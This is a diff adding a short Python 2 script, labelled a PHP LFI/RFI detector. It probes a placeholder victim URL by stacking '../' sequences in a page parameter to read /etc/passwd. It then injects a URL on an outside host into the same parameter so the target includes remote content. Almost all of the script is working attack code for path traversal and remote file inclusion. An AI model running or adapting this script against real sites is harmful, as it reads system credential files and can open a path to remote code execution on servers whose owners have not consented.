@@ -1,0 +1,34 @@
+#!/usr/bin/env python
+print "\n### PHP LFI/RFI Detector ###"
+print "### Sean Arries 09/18/09 ###\n"
+
+import urllib2,re,sys
+
+TARGET = "http://www.victim.com/vuln/index.php?page=news"
+RFIVULN = "http://www.rsauron.com/bad.txt?"
+TravLimit = 12
+
+print "==> Testing for LFI vulns.."
+TARGET = TARGET.split("=")[0]+"=" ## URL MANUPLIATION 
+for x in xrange(1,TravLimit): ## ITERATE THROUGH THE LOOP
+    TARGET += "../"
+    try:
+        source = urllib2.urlopen((TARGET+"etc/passwd")).read() ## WEB REQUEST
+    except urllib2.URLError, e:
+        print "$$$ We had an Error:",e
+        sys.exit(0)
+    if re.search("root:x:0:0:",source): ## SEARCH FOR TEXT IN SOURCE
+        print "!! ==> LFI Found:",TARGET+"etc/passwd"
+        break ## BREAK LOOP WHEN VULN FOUND
+
+print "\n==> Testing for RFI vulns.."
+TARGET = TARGET.split("=")[0]+"="+RFIVULN ## URL MANUPLIATION
+try:
+    source = urllib2.urlopen(TARGET).read() ## WEB REQUEST
+except urllib2.URLError, e:
+    print "$$$ We had an Error:",e
+    sys.exit(0)
+if re.search("N3t",source): ## SEARCH FOR TEXT IN SOURCE
+    print "!! => RFI Found:",TARGET
+    
+print "\nScan Complete\n" ## DONE
